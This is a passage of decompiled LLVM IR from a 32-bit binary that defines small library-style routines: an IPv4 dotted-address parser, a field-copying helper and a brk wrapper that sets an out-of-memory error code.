  uselistorder i32 24, { 0, 69, 70, 39, 40, 1, 71, 72, 36, 37, 16, 15, 41, 83, 42, 43, 62, 65, 44, 45, 46, 17, 47, 18, 48, 19, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 66, 61, 67, 63, 64, 84, 85, 86, 68, 13, 12, 87, 2, 73, 20, 3, 74, 21, 22, 4, 75, 23, 76, 24, 5, 25, 26, 6, 27, 7, 8, 9, 28, 10, 77, 29, 78, 79, 80, 30, 31, 11, 81, 32, 82, 33, 88, 89, 90, 91, 92, 34, 93, 14, 38, 35, 94 }
  uselistorder i32* @lr, { 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 0, 125, 126, 127, 1, 128, 129, 130, 2, 131, 132, 133, 134, 135, 136, 137, 138, 13, 14, 139, 140, 57, 58, 59, 60, 76, 77, 78, 79, 15, 16, 17, 18, 19, 80, 81, 3, 4, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 5, 61, 62, 67, 68, 69, 65, 66, 63, 64, 51, 52, 53, 54, 55, 22, 97, 6, 7, 8, 9, 10, 11, 12, 20, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 56, 98, 99, 100, 70, 71, 72, 73, 74, 75, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32 16, { 29, 30, 31, 173, 32, 174, 175, 33, 176, 177, 34, 178, 179, 180, 181, 182, 183, 80, 81, 71, 72, 85, 82, 83, 84, 86, 24, 87, 88, 5, 6, 7, 8, 9, 23, 10, 11, 1, 12, 13, 46, 156, 47, 73, 35, 48, 74, 75, 14, 158, 159, 160, 25, 0, 15, 16, 22, 69, 17, 161, 18, 49, 157, 39, 38, 37, 76, 36, 77, 40, 50, 51, 52, 53, 54, 55, 78, 56, 79, 57, 58, 26, 89, 90, 91, 92, 59, 93, 94, 95, 96, 97, 98, 99, 60, 100, 101, 102, 42, 103, 41, 104, 105, 62, 106, 107, 108, 109, 110, 2, 61, 111, 112, 113, 64, 114, 115, 116, 117, 118, 3, 63, 119, 65, 120, 121, 122, 19, 123, 20, 124, 70, 21, 66, 67, 125, 126, 4, 44, 127, 43, 128, 129, 130, 131, 132, 133, 27, 134, 135, 136, 137, 139, 138, 140, 141, 142, 143, 144, 145, 146, 28, 147, 148, 149, 150, 151, 153, 152, 154, 155, 162, 163, 164, 165, 166, 68, 167, 45, 168, 169, 170, 171, 172 }
  uselistorder i32 20, { 112, 4, 113, 114, 1, 5, 115, 28, 29, 22, 23, 2, 30, 31, 32, 33, 24, 17, 25, 18, 26, 19, 27, 95, 6, 96, 7, 97, 0, 94, 34, 35, 8, 36, 37, 38, 39, 40, 41, 42, 9, 43, 44, 45, 46, 47, 48, 49, 50, 51, 10, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 11, 62, 63, 64, 65, 66, 67, 68, 69, 12, 70, 71, 72, 3, 73, 74, 75, 76, 20, 77, 78, 79, 80, 81, 82, 83, 84, 14, 85, 13, 86, 87, 88, 89, 16, 90, 15, 91, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 21, 111 }
  uselistorder i32 27, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 7, { 29, 30, 32, 65, 70, 4, 33, 5, 16, 34, 17, 35, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 36, 37, 38, 6, 39, 40, 41, 42, 7, 43, 44, 45, 46, 8, 47, 9, 48, 10, 49, 50, 11, 51, 52, 12, 53, 54, 55, 56, 57, 13, 58, 59, 60, 61, 62, 14, 63, 3, 64, 0, 27, 66, 1, 28, 67, 68, 31, 15, 69 }
  uselistorder i32 -8, { 16, 17, 18, 19, 20, 21, 15, 14, 7, 13, 12, 11, 10, 22, 23, 24, 25, 8, 26, 0, 29, 9, 27, 28, 6, 1, 3, 2, 4, 5 }
  uselistorder i32* @ip, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 4, 5, 49, 1, 0, 2, 3 }
  uselistorder i1 false, { 41, 42, 43, 77, 14, 40, 78, 79, 37, 38, 39, 80, 13, 81, 82, 0, 46, 45, 47, 44, 1, 3, 4, 49, 2, 11, 5, 6, 7, 48, 83, 84, 85, 10, 8, 9, 86, 52, 87, 88, 53, 89, 19, 20, 21, 22, 54, 90, 91, 70, 92, 93, 94, 59, 95, 24, 25, 60, 96, 61, 97, 55, 56, 57, 23, 98, 58, 99, 100, 69, 101, 102, 103, 104, 105, 106, 62, 63, 107, 108, 64, 109, 65, 66, 110, 67, 111, 68, 112, 50, 51, 113, 114, 115, 116, 117, 118, 26, 27, 71, 119, 120, 72, 33, 121, 73, 16, 17, 28, 18, 29, 30, 31, 12, 32, 122, 34, 35, 74, 75, 123, 15, 76, 124, 36, 125 }
  uselistorder i32 4, { 82, 73, 74, 5, 421, 75, 422, 59, 6, 7, 76, 423, 77, 424, 425, 426, 427, 78, 428, 429, 430, 431, 79, 432, 433, 434, 435, 436, 8, 437, 438, 439, 440, 441, 80, 442, 58, 443, 444, 445, 446, 447, 448, 9, 10, 81, 449, 229, 230, 194, 195, 231, 232, 233, 450, 451, 452, 453, 454, 138, 139, 140, 60, 141, 142, 383, 385, 384, 381, 382, 343, 344, 345, 346, 386, 387, 388, 389, 371, 372, 373, 390, 391, 143, 144, 145, 146, 147, 51, 11, 12, 234, 235, 236, 237, 238, 239, 13, 14, 68, 15, 16, 69, 392, 393, 192, 17, 18, 103, 83, 394, 395, 61, 196, 104, 197, 347, 348, 215, 216, 148, 349, 350, 198, 199, 149, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 105, 218, 219, 220, 217, 70, 351, 106, 221, 352, 150, 151, 84, 107, 108, 19, 353, 20, 152, 354, 355, 21, 22, 356, 357, 53, 358, 52, 153, 363, 109, 365, 110, 366, 154, 367, 364, 359, 111, 360, 361, 362, 306, 240, 222, 64, 63, 62, 223, 112, 23, 24, 25, 26, 27, 28, 224, 54, 225, 55, 226, 227, 228, 29, 30, 113, 0, 114, 85, 115, 116, 31, 241, 242, 155, 243, 244, 245, 156, 157, 118, 246, 117, 247, 86, 248, 249, 158, 250, 251, 159, 160, 252, 87, 253, 88, 254, 255, 161, 162, 256, 163, 257, 258, 164, 165, 119, 259, 89, 260, 90, 261, 262, 263, 264, 265, 120, 266, 91, 267, 268, 269, 166, 270, 271, 272, 273, 167, 168, 2, 274, 121, 275, 92, 276, 277, 278, 169, 279, 280, 170, 171, 3, 122, 281, 93, 282, 94, 283, 284, 172, 285, 286, 287, 288, 289, 173, 174, 290, 291, 124, 292, 4, 123, 293, 95, 294, 125, 295, 296, 297, 298, 299, 175, 300, 301, 302, 176, 177, 127, 303, 126, 96, 304, 97, 305, 307, 308, 309, 310, 311, 129, 312, 130, 313, 178, 314, 315, 316, 179, 180, 131, 317, 128, 318, 98, 319, 99, 320, 181, 321, 322, 32, 182, 323, 324, 33, 183, 325, 326, 34, 184, 327, 328, 35, 185, 71, 329, 330, 36, 331, 186, 332, 333, 37, 187, 334, 335, 38, 188, 336, 337, 39, 189, 338, 339, 40, 190, 340, 341, 41, 396, 342, 368, 369, 370, 374, 375, 376, 42, 377, 378, 1, 379, 191, 380, 397, 398, 102, 399, 400, 72, 401, 132, 402, 403, 404, 405, 100, 406, 133, 407, 408, 409, 101, 410, 134, 411, 43, 44, 45, 412, 413, 67, 66, 65, 414, 46, 47, 48, 135, 415, 136, 416, 49, 50, 417, 56, 418, 57, 137, 419, 420, 193 }
  uselistorder i32* @r2, { 76, 77, 24, 9, 25, 27, 26, 28, 29, 30, 31, 8, 78, 2, 79, 84, 85, 88, 80, 47, 51, 52, 55, 53, 54, 48, 49, 50, 41, 14, 15, 0, 16, 17, 1, 86, 3, 87, 6, 32, 33, 34, 10, 81, 82, 83, 4, 56, 57, 58, 7, 59, 60, 61, 5, 62, 63, 64, 65, 66, 42, 11, 12, 13, 45, 46, 43, 44, 38, 18, 19, 20, 21, 22, 23, 35, 36, 37, 39, 40, 67, 68, 69, 70, 71, 72, 73, 74, 75 }
  uselistorder label %dec_label_pc_15558, { 2, 0, 1 }
  uselistorder label %dec_label_pc_154ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15480, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15420, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 3, 2 }
  uselistorder label %dec_label_pc_153ac, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_15370, { 1, 0 }
  uselistorder label %dec_label_pc_1535c, { 1, 0 }
  uselistorder label %dec_label_pc_1531c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_152b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15244, { 2, 0, 1 }
  uselistorder label %dec_label_pc_151e4, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb131, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_15158, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_15118, { 1, 0 }
}

define i32 @function_15578(i32 %arg1) local_unnamed_addr {
dec_label_pc_15578:
  ret i32 %arg1
}

define i32 @function_15580() local_unnamed_addr {
dec_label_pc_15580:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_15580 = load i32, i32* @r0, align 4
  %v2_15580 = icmp eq i32 %v0_15580, 0
  %v3_15584 = load i32, i32* @r4, align 4
  store i32 %v3_15584, i32* %stack_var_-20, align 4
  %v0_15588 = load i32, i32* @r1, align 4
  br i1 %v2_15580, label %dec_label_pc_15660, label %dec_label_pc_1559c.lr.ph

dec_label_pc_1559c:                               ; preds = %dec_label_pc_1559c.lr.ph, %dec_label_pc_15620
  %v1_15620 = phi i32 [ 0, %dec_label_pc_1559c.lr.ph ], [ %v5_15620, %dec_label_pc_15620 ]
  %v0_15624 = phi i32 [ 1, %dec_label_pc_1559c.lr.ph ], [ %v1_15624, %dec_label_pc_15620 ]
  %v0_155a4 = phi i32 [ %v0_15580, %dec_label_pc_1559c.lr.ph ], [ %v0_155a425, %dec_label_pc_15620 ]
  %v1_155a4 = inttoptr i32 %v0_155a4 to i8*
  %v2_155a4 = load i8, i8* %v1_155a4, align 1
  %v3_155a4 = zext i8 %v2_155a4 to i32
  %v3_155a8 = mul nuw nsw i32 %v3_155a4, 2
  %v4_155a8 = add i32 %v3_155a8, %v2_155a0.pre
  %v5_155a8 = inttoptr i32 %v4_155a8 to i8*
  %v6_155a8 = load i8, i8* %v5_155a8, align 1
  %v1_155ac = and i8 %v6_155a8, 8
  %v2_155ac = icmp eq i8 %v1_155ac, 0
  br i1 %v2_155ac, label %dec_label_pc_15660, label %dec_label_pc_155b4

dec_label_pc_155b4:                               ; preds = %dec_label_pc_1559c
  br label %dec_label_pc_155d4

dec_label_pc_155bc:                               ; preds = %dec_label_pc_155d4
  %v3_155c0 = mul i32 %v0_15620, 10
  %v4_155c0 = add i32 %v3_155d4, %v3_155c0
  %v1_155c4 = add i32 %v4_155c0, -48
  %v8_155cc = icmp sgt i32 %v1_155c4, 255
  br i1 %v8_155cc, label %dec_label_pc_15660, label %dec_label_pc_155d0

dec_label_pc_155d0:                               ; preds = %dec_label_pc_155bc
  %v1_155d0 = add i32 %v0_15610, 1
  store i32 %v1_155d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155d4

dec_label_pc_155d4:                               ; preds = %dec_label_pc_155b4, %dec_label_pc_155d0
  %v0_15620 = phi i32 [ 0, %dec_label_pc_155b4 ], [ %v1_155c4, %dec_label_pc_155d0 ]
  %v0_15610 = phi i32 [ %v0_155a4, %dec_label_pc_155b4 ], [ %v1_155d0, %dec_label_pc_155d0 ]
  %v1_155d4 = inttoptr i32 %v0_15610 to i8*
  %v2_155d4 = load i8, i8* %v1_155d4, align 1
  %v3_155d4 = zext i8 %v2_155d4 to i32
  %v2_155d8 = mul nuw nsw i32 %v3_155d4, 2
  %v2_155dc = add i32 %v2_155d8, %v2_155a0.pre
  %v3_155e0 = inttoptr i32 %v2_155dc to i8*
  %v4_155e0 = load i8, i8* %v3_155e0, align 1
  %v6_155e0 = zext i8 %v4_155e0 to i32
  %v1_155ec = and i32 %v6_155e0, 8
  %v2_155ec = icmp eq i32 %v1_155ec, 0
  br i1 %v2_155ec, label %dec_label_pc_155f4, label %dec_label_pc_155bc

dec_label_pc_155f4:                               ; preds = %dec_label_pc_155d4
  %v8_155f8 = icmp sgt i32 %v0_15624, 3
  br i1 %v8_155f8, label %dec_label_pc_1560c, label %dec_label_pc_155fc

dec_label_pc_155fc:                               ; preds = %dec_label_pc_155f4
  %v7_155fc = icmp eq i8 %v2_155d4, 46
  br i1 %v7_155fc, label %dec_label_pc_15604, label %dec_label_pc_15660

dec_label_pc_15604:                               ; preds = %dec_label_pc_155fc
  %v1_15604 = add i32 %v0_15610, 1
  store i32 %v1_15604, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15620

dec_label_pc_1560c:                               ; preds = %dec_label_pc_155f4
  %v2_1560c = icmp eq i8 %v2_155d4, 0
  %v1_15610 = add i32 %v0_15610, 1
  store i32 %v1_15610, i32* %r0.global-to-local, align 4
  br i1 %v2_1560c, label %dec_label_pc_15620, label %dec_label_pc_15618

dec_label_pc_15618:                               ; preds = %dec_label_pc_1560c
  %v1_15618 = and i32 %v6_155e0, 32
  %v2_15618 = icmp eq i32 %v1_15618, 0
  br i1 %v2_15618, label %dec_label_pc_15660, label %dec_label_pc_15620

dec_label_pc_15620:                               ; preds = %dec_label_pc_15618, %dec_label_pc_1560c, %dec_label_pc_15604
  %v0_155a425 = phi i32 [ %v1_15610, %dec_label_pc_15618 ], [ %v1_15610, %dec_label_pc_1560c ], [ %v1_15604, %dec_label_pc_15604 ]
  %v4_15620 = mul i32 %v1_15620, 256
  %v5_15620 = or i32 %v0_15620, %v4_15620
  %v1_15624 = add nuw nsw i32 %v0_15624, 1
  %v7_1562c = icmp slt i32 %v1_15624, 5
  br i1 %v7_1562c, label %dec_label_pc_1559c, label %dec_label_pc_15630

dec_label_pc_1559c.lr.ph:                         ; preds = %dec_label_pc_15580
  %v2_155a0.pre = load i32, i32* bitcast (i32** @global_var_1e390.623 to i32*), align 4
  br label %dec_label_pc_1559c

dec_label_pc_15630:                               ; preds = %dec_label_pc_15620
  %v2_15630 = icmp eq i32 %v0_15588, 0
  br i1 %v2_15630, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_15630
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb40:                                             ; preds = %dec_label_pc_15630
  %v3_1564c = call i32 @llvm.bswap.i32(i32 %v5_15620)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_15658 = inttoptr i32 %v0_15588 to i32*
  store i32 %v3_1564c, i32* %v3_15658, align 4
  %v2_1565c.pre = load i32, i32* %stack_var_-20, align 4
  %v17_1565c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb40
  %v17_1565c = phi i32 [ 1, %bb ], [ %v17_1565c.pre, %bb40 ]
  %v2_1565c = phi i32 [ %v3_15584, %bb ], [ %v2_1565c.pre, %bb40 ]
  store i32 %v2_1565c, i32* @r4, align 4
  ret i32 %v17_1565c

dec_label_pc_15660:                               ; preds = %dec_label_pc_155fc, %dec_label_pc_15618, %dec_label_pc_1559c, %dec_label_pc_155bc, %dec_label_pc_15580
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_15584, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_155a0.pre, { 1, 0 }
  uselistorder i32 %v1_15624, { 1, 0 }
  uselistorder i32 %v0_15610, { 0, 1, 3, 2 }
  uselistorder i32 %v3_15584, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32 5, { 14, 23, 24, 15, 5, 2, 17, 25, 3, 16, 26, 0, 18, 19, 20, 21, 27, 28, 29, 30, 6, 31, 32, 33, 34, 7, 35, 36, 37, 38, 39, 40, 41, 42, 8, 43, 44, 45, 9, 46, 47, 48, 10, 49, 50, 51, 52, 11, 53, 54, 55, 56, 57, 58, 59, 12, 60, 61, 62, 63, 64, 65, 66, 13, 67, 4, 68, 69, 1, 70, 71, 22, 72 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65, 66, 67, 63, 64, 68, 71, 72, 73, 69, 70, 74, 75, 76, 438, 439, 77, 78, 79, 440, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 93, 92, 96, 95, 94, 435, 441, 101, 97, 100, 98, 99, 432, 103, 102, 104, 105, 106, 107, 108, 109, 110, 112, 113, 111, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 131, 130, 132, 133, 134, 138, 144, 139, 135, 140, 145, 141, 146, 142, 136, 147, 137, 148, 149, 143, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 161, 162, 160, 163, 166, 167, 165, 164, 168, 171, 170, 169, 178, 175, 172, 173, 179, 176, 180, 177, 181, 174, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 199, 198, 200, 201, 202, 213, 208, 203, 214, 209, 215, 210, 216, 211, 204, 205, 206, 217, 218, 219, 220, 212, 207, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 233, 232, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 246, 245, 255, 251, 247, 256, 252, 248, 257, 253, 258, 254, 249, 250, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 277, 276, 275, 283, 278, 289, 290, 284, 279, 291, 292, 285, 280, 293, 286, 294, 287, 295, 288, 296, 281, 297, 282, 298, 299, 300, 301, 302, 303, 304, 307, 308, 311, 309, 305, 312, 310, 306, 315, 314, 313, 318, 319, 316, 320, 317, 321, 325, 322, 327, 326, 323, 324, 328, 433, 437, 329, 330, 331, 332, 333, 336, 334, 335, 338, 337, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 354, 353, 355, 356, 358, 357, 359, 360, 361, 362, 365, 372, 366, 367, 363, 368, 369, 370, 364, 373, 371, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 387, 386, 388, 389, 390, 394, 401, 395, 396, 402, 397, 391, 392, 398, 393, 399, 403, 400, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 417, 416, 418, 419, 420, 421, 423, 422, 424, 425, 426, 427, 428, 431, 442, 434, 443, 429, 430, 436 }
  uselistorder i32 32, { 72, 55, 56, 53, 67, 68, 64, 65, 66, 5, 4, 7, 6, 9, 8, 54, 52, 73, 74, 58, 57, 11, 10, 13, 12, 15, 14, 17, 16, 0, 18, 19, 20, 22, 21, 23, 25, 24, 27, 26, 28, 29, 31, 30, 59, 69, 70, 32, 71, 33, 34, 35, 1, 36, 2, 3, 37, 38, 39, 40, 41, 43, 42, 60, 75, 61, 76, 62, 77, 45, 44, 47, 46, 48, 49, 50, 51, 63 }
  uselistorder i8 46, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 3, { 37, 58, 59, 160, 60, 61, 62, 63, 64, 65, 78, 85, 161, 5, 148, 155, 156, 0, 66, 22, 67, 23, 157, 73, 38, 24, 26, 79, 41, 80, 3, 81, 82, 83, 84, 39, 6, 1, 149, 150, 25, 151, 42, 152, 40, 153, 43, 27, 88, 44, 45, 2, 86, 87, 46, 89, 90, 91, 92, 93, 94, 47, 95, 48, 96, 28, 97, 98, 99, 100, 101, 8, 7, 49, 29, 102, 103, 104, 105, 106, 107, 108, 10, 9, 50, 109, 30, 110, 111, 112, 113, 114, 115, 116, 117, 12, 11, 51, 118, 31, 119, 120, 121, 122, 123, 14, 13, 52, 124, 32, 125, 126, 127, 128, 53, 129, 16, 15, 34, 130, 33, 131, 132, 133, 134, 135, 136, 18, 17, 54, 137, 35, 138, 139, 140, 141, 142, 143, 144, 20, 19, 55, 145, 36, 146, 21, 147, 4, 154, 158, 68, 74, 69, 75, 70, 76, 71, 77, 56, 159, 57, 72 }
  uselistorder i32 8, { 119, 156, 29, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 30, 173, 66, 67, 68, 69, 73, 70, 71, 72, 174, 142, 141, 139, 140, 120, 121, 122, 143, 144, 145, 133, 134, 135, 6, 33, 34, 31, 32, 17, 18, 26, 27, 35, 175, 74, 75, 76, 77, 7, 8, 61, 21, 9, 10, 16, 11, 51, 36, 52, 37, 53, 38, 12, 13, 14, 54, 65, 28, 123, 124, 125, 127, 128, 126, 15, 55, 78, 39, 79, 80, 81, 82, 83, 84, 85, 86, 87, 3, 88, 89, 90, 4, 91, 92, 93, 94, 95, 96, 97, 5, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 40, 109, 41, 110, 42, 111, 43, 112, 44, 113, 45, 114, 46, 115, 47, 116, 48, 117, 56, 118, 0, 1, 129, 130, 131, 132, 59, 136, 137, 57, 138, 2, 19, 22, 23, 146, 20, 24, 25, 147, 58, 62, 63, 148, 149, 151, 150, 152, 153, 49, 154, 60, 64, 50, 155 }
  uselistorder i32 255, { 2, 16, 3, 18, 4, 19, 5, 20, 0, 1, 8, 21, 9, 22, 6, 23, 7, 24, 12, 25, 13, 26, 10, 27, 11, 28, 15, 17, 14, 29 }
  uselistorder i32 10, { 13, 83, 84, 0, 4, 5, 75, 76, 156, 1, 2, 14, 79, 9, 15, 80, 7, 108, 16, 109, 17, 110, 18, 111, 19, 112, 20, 113, 21, 114, 22, 115, 23, 116, 24, 117, 25, 118, 26, 119, 27, 120, 28, 121, 29, 122, 30, 123, 31, 124, 32, 125, 33, 126, 34, 127, 35, 128, 36, 129, 37, 130, 38, 131, 39, 132, 40, 133, 41, 134, 42, 135, 43, 136, 44, 137, 45, 138, 46, 139, 47, 140, 48, 141, 49, 142, 50, 143, 51, 144, 52, 145, 53, 146, 54, 147, 55, 148, 56, 149, 57, 150, 58, 151, 59, 152, 60, 154, 153, 61, 62, 63, 64, 65, 66, 67, 81, 68, 82, 10, 85, 86, 3, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 69, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 8, 107, 11, 157, 155, 158, 6, 73, 77, 159, 71, 160, 74, 78, 12, 161, 70, 162, 72 }
  uselistorder i8 0, { 7, 0, 1, 27, 28, 2, 12, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 8, 40, 41, 42, 43, 44, 45, 3, 14, 13, 46, 47, 48, 49, 5, 6, 4, 50, 51, 52, 16, 15, 53, 54, 57, 24, 55, 56, 23, 58, 59, 60, 61, 62, 17, 9, 18, 63, 19, 20, 26, 64, 65, 66, 68, 69, 11, 72, 22, 78, 73, 74, 70, 71, 21, 25, 75, 76, 77, 10, 79, 80, 67, 81, 82, 83, 84, 85, 86 }
  uselistorder i32 2, { 4, 136, 258, 259, 58, 260, 261, 48, 262, 47, 263, 46, 141, 71, 72, 243, 73, 244, 74, 245, 5, 137, 264, 53, 75, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 139, 15, 16, 17, 18, 19, 77, 78, 76, 49, 50, 79, 142, 80, 85, 143, 82, 144, 151, 63, 145, 64, 146, 65, 147, 84, 148, 66, 149, 67, 150, 83, 156, 152, 153, 154, 155, 59, 54, 233, 20, 21, 234, 236, 237, 86, 240, 81, 241, 22, 87, 235, 221, 138, 140, 167, 89, 157, 92, 158, 91, 159, 88, 93, 160, 23, 24, 25, 94, 90, 95, 96, 97, 161, 162, 98, 99, 60, 101, 102, 100, 103, 163, 51, 57, 164, 165, 166, 238, 239, 168, 169, 170, 171, 172, 173, 174, 105, 175, 104, 176, 177, 178, 179, 180, 107, 106, 181, 182, 183, 184, 185, 186, 187, 109, 188, 108, 189, 190, 110, 111, 68, 112, 191, 192, 193, 194, 195, 196, 197, 1, 26, 27, 28, 29, 30, 31, 113, 198, 69, 199, 200, 201, 202, 203, 2, 32, 33, 34, 35, 36, 37, 115, 114, 204, 205, 38, 206, 207, 55, 208, 117, 209, 3, 39, 40, 41, 42, 43, 118, 210, 116, 211, 212, 213, 214, 215, 216, 217, 218, 120, 219, 119, 220, 222, 223, 224, 122, 225, 123, 226, 227, 228, 229, 124, 230, 121, 231, 61, 232, 125, 62, 242, 52, 126, 246, 247, 70, 248, 133, 249, 127, 250, 128, 129, 251, 130, 252, 131, 253, 132, 254, 56, 255, 44, 45, 256, 134, 257, 135 }
  uselistorder i32* @r1, { 41, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 1, 108, 109, 14, 15, 17, 16, 5, 6, 110, 0, 111, 48, 49, 12, 113, 50, 55, 56, 59, 57, 58, 51, 52, 53, 54, 43, 60, 112, 10, 4, 42, 18, 61, 62, 3, 63, 64, 65, 44, 7, 8, 9, 47, 38, 21, 11, 13, 19, 20, 45, 46, 2, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder label %dec_label_pc_15660, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_155d4, { 1, 0 }
}

define i32 @function_1566c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1566c:
  %v1_1566c = add i32 %arg1, 28
  %v2_1566c = inttoptr i32 %v1_1566c to i32*
  %v3_1566c = load i32, i32* %v2_1566c, align 4
  %v1_15674 = add i32 %arg1, 44
  %v2_15674 = inttoptr i32 %v1_15674 to i32*
  %v3_15674 = load i32, i32* %v2_15674, align 4
  store i32 %v3_1566c, i32* @global_var_1ead0.676, align 4
  store i32 %v3_15674, i32* @global_var_1ead4.678, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 17, 0, 6, 7, 4, 5, 12, 13, 8, 9, 10, 11, 2, 14, 1, 15, 3, 16 }
  uselistorder i32 28, { 27, 0, 12, 13, 3, 4, 21, 1, 5, 6, 7, 8, 9, 10, 11, 2, 23, 22, 14, 15, 16, 17, 18, 19, 20, 24, 25, 26 }
}

define i32 @function_15690(i32* %arg1) local_unnamed_addr {
dec_label_pc_15690:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_15698 = call i32 @brk(i32* %arg1)
  %v3_1569c = icmp ult i32 %v2_15698, %tmp
  store i32 %v2_15698, i32* @global_var_1e468.673, align 4
  br i1 %v3_1569c, label %dec_label_pc_156b0, label %dec_label_pc_156c0

dec_label_pc_156b0:                               ; preds = %dec_label_pc_15690
  %v0_156b0 = call i32 @function_13470()
  %v2_156b8 = inttoptr i32 %v0_156b0 to i32*
  store i32 12, i32* %v2_156b8, align 4
  br label %dec_label_pc_156c0

dec_label_pc_156c0:                               ; preds = %dec_label_pc_15690, %dec_label_pc_156b0
  %v0_156c0 = phi i32 [ 0, %dec_label_pc_15690 ], [ -1, %dec_label_pc_156b0 ]
  ret i32 %v0_156c0

; uselistorder directives
  uselistorder i32 12, { 17, 11, 122, 123, 124, 126, 127, 128, 129, 12, 125, 130, 131, 132, 133, 134, 135, 136, 48, 49, 31, 32, 50, 18, 19, 107, 108, 109, 0, 86, 110, 8, 111, 9, 87, 4, 106, 20, 21, 7, 51, 52, 22, 53, 54, 13, 14, 33, 34, 88, 89, 35, 36, 37, 38, 39, 40, 41, 42, 44, 45, 43, 90, 91, 92, 10, 93, 94, 95, 97, 98, 99, 5, 101, 96, 46, 47, 6, 23, 24, 25, 26, 27, 28, 100, 55, 15, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 29, 67, 68, 69, 70, 71, 30, 72, 73, 74, 75, 76, 77, 16, 78, 79, 80, 81, 82, 83, 84, 85, 1, 2, 102, 103, 104, 105, 3, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121 }
  uselistorder i32 ()* @function_13470, { 28, 37, 27, 47, 11, 10, 9, 8, 46, 45, 44, 7, 62, 26, 25, 51, 50, 23, 24, 61, 60, 22, 21, 36, 20, 35, 19, 49, 18, 34, 17, 38, 59, 43, 42, 41, 58, 48, 16, 4, 3, 57, 15, 40, 39, 56, 2, 6, 55, 30, 5, 29, 14, 54, 1, 0, 33, 32, 53, 52, 31, 13, 12 }
  uselistorder i32* @global_var_1e468.673, { 1, 0, 2, 3 }
